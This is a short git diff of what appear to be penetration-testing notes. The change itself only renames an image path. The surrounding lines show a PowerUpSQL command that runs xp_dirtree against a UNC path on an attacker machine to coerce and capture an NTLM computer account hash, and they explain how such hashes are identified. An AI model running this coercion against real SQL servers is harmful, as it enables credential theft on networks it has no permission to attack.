@@ -91,7 +91,7 @@ Get-SQLQuery -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -Instance web0
 
 The part `EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1` is the SQL query which will execute the UNC PATH injection attack. After executing the command we receive the hash of the computeraccount on our kali machine:
 
-![](<../../../.gitbook/assets/image (10) (1) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (1) (3).png>)
 
 Since its a computer account hash we wont be able to crack it. How do we know its a computer account hash? Computer accounts ends with a Dollar sign $. We could always double check by quering the domain and check if its a computer of normal user or search it up in the bloodhound data.
 
